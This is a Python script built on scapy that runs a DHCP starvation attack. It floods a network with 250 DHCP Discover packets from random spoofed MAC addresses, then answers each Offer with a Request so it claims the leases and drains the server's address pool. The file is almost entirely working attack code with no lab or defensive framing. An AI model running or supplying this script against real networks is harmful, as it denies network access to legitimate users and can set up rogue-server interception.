import socket
from scapy.all import *
import random
import multiprocessing
import struct

def Change_Mac_Bytes(mac_bin_list):
	mac_list = []
	for i in mac_bin_list:
		print("Hex",i)
		mac = int(i,16)
		mac_list.append(mac)
		print("int 10",mac)
	Fake_HW = struct.pack("!BBBBBB",mac_list[0], mac_list[1], mac_list[2], mac_list[3], mac_list[4], mac_list[5])
	return Fake_HW

def Change_Byte_To_Mac(MAC_Bytes):
	mac = struct.unpack("!BBBBBB",MAC_Bytes)
	mac_str = []
	for i in mac:
		print("unpack",i)
		mac_str.append(hex(i))
	Hardware = ":".join(mac_str).replace("0x","")
	return Hardware

def DHCP_ID():
	id = random.randint(12345678,87654321)
	id = int(hex(id),16)
	print(id)
	return id
# def randomMAC():
# 	mac = [ 0x00, 0x0c, 0x29,
# 		random.randint(0x00, 0x7f),
# 		random.randint(0x00, 0xff),
# 		random.randint(0x00, 0xff) ]
# 	return ':'.join(map(lambda x: "%02x" % x, mac))

def DHCP_request_SendOnly(options):

	ethernet = Ether(dst="ff:ff:ff:ff:ff:ff",src=options['MAC'])
	ip = IP(src ='0.0.0.0',dst='255.255.255.255')
	dot1q = Dot1Q(vlan=2)
	udp = UDP (sport=68,dport=67)
	bootp = BOOTP(op=1, chaddr=options['client_id'] + b"\x00" * 10,siaddr=options["Server_IP"],xid=options['xid'])
	dhcp = DHCP(options=[("message-type","request"),("server_id",options['Server_IP']),('requested_addr',options['requested_addr']),('client_id',b'\x01'+options['client_id']),("end")])
	packet = ethernet / ip / udp / bootp / dhcp
	sendp(packet)


def dhcp_monitor_only(pkt):
	try:
		if pkt.getlayer(DHCP).fields['options'][0][1] == 1:
			MAC_Bytes = pkt.getlayer(BOOTP).fields['chaddr']
			xid = pkt.getlayer(BOOTP).fields['xid']
			for option in pkt.getlayer(DHCP).fields['options']:
				if option == "end":
					break
				print(str(option[0]), str(option[1]))
		elif pkt.getlayer(DHCP).fields['options'][0][1] == 2:
			options = {}
			MAC_Bytes = pkt.getlayer(BOOTP).fields['chaddr']
			options['xid'] = pkt.getlayer(BOOTP).fields['xid']
			options['MAC'] = Change_Byte_To_Mac(MAC_Bytes[:6])
			options['client_id']=MAC_Bytes[:6]
			for i in pkt.getlayer(DHCP).fields['options']:
				if i[0] == "server_id":
					options["Server_IP"] = i[1]
			options['requested_addr']= pkt.getlayer(BOOTP).fields['yiaddr']
			print(options)
			Send_request = multiprocessing.Process(target=DHCP_request_SendOnly,args=(options,))
			Send_request.start()
	except Exception as e:
		print(e)
		pass


def dhcp_discovery_sendonly():
		xid = random.randint(1,100000)
		mac_address = RandMAC()
		mac_bin_list = str(mac_address).split(":")
		mac_address = Change_Mac_Bytes(mac_bin_list)
		ethernet = Ether(dst='ff:ff:ff:ff:ff:ff',src=mac_address)
		# dot1q = Dot1Q(vlan2)
		ip = IP(src ='0.0.0.0',dst='255.255.255.255')
		udp =UDP (sport=68,dport=67)
		bootp = BOOTP(op=1,chaddr=mac_address + b"\x00"*10,xid=xid)
		dhcp = DHCP(options=[("message-type","discover"),("end")])
		packet = ethernet/ip/udp/bootp/dhcp
		sendp(packet)


if __name__ == '__main__':
	for i in range(250):
		dhcp_start = multiprocessing.Process(target=dhcp_discovery_sendonly)
		dhcp_start.start()
		sniff(prn=dhcp_monitor_only,filter='port 68 and port 67',store=0, timeout=10)


